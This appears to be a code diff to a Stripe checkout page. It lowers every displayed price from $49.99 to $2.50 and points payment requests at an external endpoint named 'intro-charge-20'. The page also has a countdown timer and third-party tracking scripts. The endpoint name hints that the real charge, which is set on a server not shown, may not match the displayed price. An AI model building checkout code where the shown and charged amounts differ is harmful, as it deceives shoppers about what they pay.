@@ -90,7 +90,6 @@
 
   .el{padding:10px 12px;border-radius:10px;border:1px solid #cfd6e4}
 
-  /* Processing overlay (from working page) */
   .overlay{position:fixed;inset:0;background:rgba(0,0,0,.6);display:none;align-items:center;justify-content:center;z-index:100}
   .overlay[aria-hidden="false"]{display:flex}
   .box{background:#fff;border-radius:16px;max-width:520px;width:92vw;padding:22px;text-align:center;box-shadow:0 10px 28px rgba(0,0,0,.3)}
@@ -130,7 +129,6 @@
             <div class="row">
               <div>
                 <div class="label">Country</div>
-                <!-- keep your select, logic will map directly -->
                 <select id="billingCountry" class="select">
                   <option value="US">United States</option>
                   <option value="CA">Canada</option>
@@ -197,7 +195,6 @@
             </label>
           </div>
 
-          <!-- Hidden full name -->
           <input id="nameInput" class="input" style="display:none">
 
           <div class="section" style="margin-top:16px">
@@ -212,7 +209,6 @@
             <div class="sub">All transactions are secure and encrypted</div>
           </div>
 
-          <!-- Apple / Google Pay -->
           <div id="prb-wrap" style="margin:10px 0 14px; display:none">
             <div id="payment-request-button"></div>
             <div class="sub" style="margin-top:6px">Or pay with card</div>
@@ -268,17 +264,16 @@
       <!-- RIGHT: SIDEBAR -->
       <aside>
         <div class="widget">
-          <!-- Dynamic product header (title + image + price) -->
           <div class="minihead">
             <img id="productImg" alt="">
             <div class="title-clip" id="productTitle">Your Item</div>
-            <div style="font-weight:900" id="priceTop">$49.99</div>
+            <div style="font-weight:900" id="priceTop">$2.50</div>
           </div>
 
-          <div class="order-row"><span>Subtotal</span><span id="subtotal">$49.99</span></div>
+          <div class="order-row"><span>Subtotal</span><span id="subtotal">$2.50</span></div>
           <div class="order-row"><span>Delivery</span><span>$0.00</span></div>
           <div class="order-row"><span>Discount</span><span id="discount">$0.00</span></div>
-          <div class="order-row" style="font-weight:900"><span>Total</span><span id="orderTotal">$49.99</span></div>
+          <div class="order-row" style="font-weight:900"><span>Total</span><span id="orderTotal">$2.50</span></div>
 
           <div class="delivery" style="margin-top:12px">
             <img id="sidebarImg2" alt="">
@@ -293,7 +288,6 @@
     </div>
   </div>
 
-  <!-- Processing overlay -->
   <div id="overlay" class="overlay" aria-hidden="true">
     <div class="box">
       <h3>Processing your payment…</h3>
@@ -302,14 +296,13 @@
     </div>
   </div>
 
-  <!-- Stripe -->
   <script src="https://js.stripe.com/v3"></script>
   <script>
     window.addEventListener('DOMContentLoaded', () => {
       // ====== CONSTANTS / CONFIG ======
       const PUBLISHABLE_KEY = "pk_live_51Rhm4sEJXIhiKzYGIPVjXwZTzuKmqU7EOA6EpDIkrNTmtm4ooWHbDcSaBlyglSdJYhCyU4VgcI8Qo09Acc8upCUD00ekSRuN4q";
-      const API_BASE = (location.origin && location.origin.startsWith('http')) ? location.origin : 'http://localhost:5000';
-      const SUBSCRIBE_URL = `${API_BASE}/api/stripe/charge-50`;
+      // Updated to use the shared Render endpoint:
+      const SUBSCRIBE_URL = "https://charmr-jfmc.onrender.com/api/stripe/intro-charge-20";
 
       // Capture affiliate params for Stripe metadata
       const urlParams  = new URLSearchParams(window.location.search);
@@ -353,7 +346,7 @@
       const hideLoading = () => overlay.setAttribute('aria-hidden','true');
 
       // ====== Price labels ======
-      const PRICE_TEXT = '$49.99';
+      const PRICE_TEXT = '$2.50';
       try { subtotal.textContent = PRICE_TEXT; orderTotal.textContent = PRICE_TEXT; priceTop.textContent = PRICE_TEXT; } catch(e){}
 
       // ====== Countdown ======
@@ -470,7 +463,7 @@
         }
       })();
 
-      // ====== ADSCURB tag mount/unmount ======
+      // ====== ADSCURB tag ======
       const ADSCURB_SRC = "https://adscurb.co/tag/analytics.js";
       function mountAdscurb(){
         if (document.getElementById('adscurb-sdk')) return;
@@ -502,13 +495,12 @@
           stripe = Stripe(PUBLISHABLE_KEY);
           elements = stripe.elements();
 
-          // Payment Request Button
           try{
             const prbWrap = document.getElementById('prb-wrap');
             const paymentRequest = stripe.paymentRequest({
               country: billingCountrySel?.value || 'US',
               currency: 'usd',
-              total: { label: 'Total', amount: 4999 },
+              total: { label: 'Total', amount: 250 }, // 2.50 if you want it accurate
               requestPayerName: true,
               requestPayerEmail: true,
               requestPayerPhone: true
@@ -585,7 +577,6 @@
             });
           }catch(e){ console.warn('Payment Request init skipped:', e); }
 
-          // Card elements
           cardNumber = elements.create('cardNumber');
           cardExpiry = elements.create('cardExpiry');
           cardCvc    = elements.create('cardCvc');
@@ -669,7 +660,6 @@
     });
   </script>
 
-  <!-- GoAffPro loader -->
   <script src="https://api.goaffpro.com/loader.js?shop=nzyvwvfbde" type="text/javascript"></script>
 </body>
 </html>
